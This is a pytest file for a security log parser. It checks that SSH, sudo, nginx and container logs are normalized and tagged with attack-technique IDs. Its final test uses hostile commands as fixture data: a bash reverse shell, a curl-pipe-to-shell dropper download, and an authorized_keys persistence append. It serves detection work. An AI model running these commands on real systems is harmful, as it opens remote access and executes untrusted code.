import importlib.util
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
REQUIRED_SCHEMA = {
    "timestamp",
    "host",
    "source_ip",
    "destination_ip",
    "event_type",
    "severity",
    "username",
    "raw_log",
    "tags",
    "technique",
    "service",
}


def load_parser():
    path = ROOT / "services" / "parser_engine" / "parser.py"
    spec = importlib.util.spec_from_file_location("parser_engine_parser_tests", path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def assert_schema(event):
    assert REQUIRED_SCHEMA.issubset(event)
    assert isinstance(event["tags"], list)
    assert event["timestamp"]
    assert event["host"]


def test_normalizes_missing_fields_and_invalid_payloads():
    parser = load_parser()
    event = parser.normalize_record({"message": "plain syslog line without optional fields"}, default_host="node-a")
    assert_schema(event)
    assert event["host"] == "node-a"
    assert event["source_ip"] == ""
    assert event["event_type"] == "LINUX_LOG"

    string_event = parser.normalize_record("raw string payload", default_host="node-b")
    assert_schema(string_event)
    assert string_event["raw_log"] == "raw string payload"


def test_auth_log_failed_and_accepted_login_parsing():
    parser = load_parser()
    failed = parser.normalize_record(
        {
            "source": "/var/log/auth.log",
            "host": "core-1",
            "log": "May 16 18:00:01 core-1 sshd[123]: Failed password for invalid user admin from 203.0.113.10 port 51222 ssh2",
            "timestamp": "2026-05-16T18:00:00+00:00",
        }
    )
    assert_schema(failed)
    assert failed["event_type"] == "FAILED_LOGIN"
    assert failed["service"] == "ssh"
    assert failed["source_ip"] == "203.0.113.10"
    assert failed["username"] == "admin"
    assert failed["technique"] == "T1110"
    assert failed["timestamp"] == "2026-05-16T18:00:00+00:00"

    accepted = parser.normalize_record(
        {
            "source": "/var/log/auth.log",
            "log": "May 16 18:01:01 core-1 sshd[123]: Accepted publickey for ubuntu from 198.51.100.7 port 60000 ssh2",
        },
        default_host="core-1",
    )
    assert accepted["event_type"] == "LOGIN_SUCCESS"
    assert accepted["source_ip"] == "198.51.100.7"
    assert accepted["username"] == "ubuntu"


def test_sudo_nginx_and_docker_parsing():
    parser = load_parser()
    sudo = parser.normalize_record(
        {
            "source": "/var/log/auth.log",
            "host": "core-1",
            "log": "May 16 18:02:00 core-1 sudo: leivy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/passwd root",
        }
    )
    assert_schema(sudo)
    assert sudo["event_type"] == "SUDO_COMMAND"
    assert sudo["service"] == "sudo"
    assert sudo["username"] == "leivy"
    assert "passwd root" in sudo["command"]
    assert sudo["technique"] == "T1548"

    nginx = parser.normalize_record(
        {
            "path": "/var/log/nginx/access.log",
            "log": '192.0.2.44 - - [16/May/2026:19:00:00 +0000] "GET /health HTTP/1.1" 200 17 "-" "curl/8"',
        },
        default_host="core-1",
    )
    assert nginx["event_type"] == "HTTP_REQUEST"
    assert nginx["service"] == "nginx"
    assert nginx["source_ip"] == "192.0.2.44"

    docker = parser.normalize_record(
        {
            "container_name": "sentinela-api-lite",
            "log": "worker ready",
            "time": "2026-05-16T19:00:00.000Z",
        }
    )
    assert docker["event_type"] == "CONTAINER_LOG"
    assert docker["service"] == "docker"
    assert docker["host"] == "sentinela-api-lite"


def test_extracts_reverse_shell_curl_and_persistence_indicators():
    parser = load_parser()
    reverse = parser.normalize_record({"log": "bash -i >& /dev/tcp/203.0.113.55/4444 0>&1"}, default_host="node")
    assert reverse["event_type"] == "REVERSE_SHELL"
    assert reverse["severity"] == "HIGH"
    assert reverse["technique"] == "T1059"

    curl = parser.normalize_record({"log": "curl http://198.51.100.2/dropper.sh | sh"}, default_host="node")
    assert curl["event_type"] == "SUSPICIOUS_DOWNLOAD"
    assert curl["source_ip"] == "198.51.100.2"
    assert curl["technique"] == "T1105"

    persistence = parser.normalize_record({"log": "echo key >> ~/.ssh/authorized_keys"}, default_host="node")
    assert persistence["event_type"] == "PERSISTENCE_INDICATOR"
    assert persistence["technique"] == "T1053"
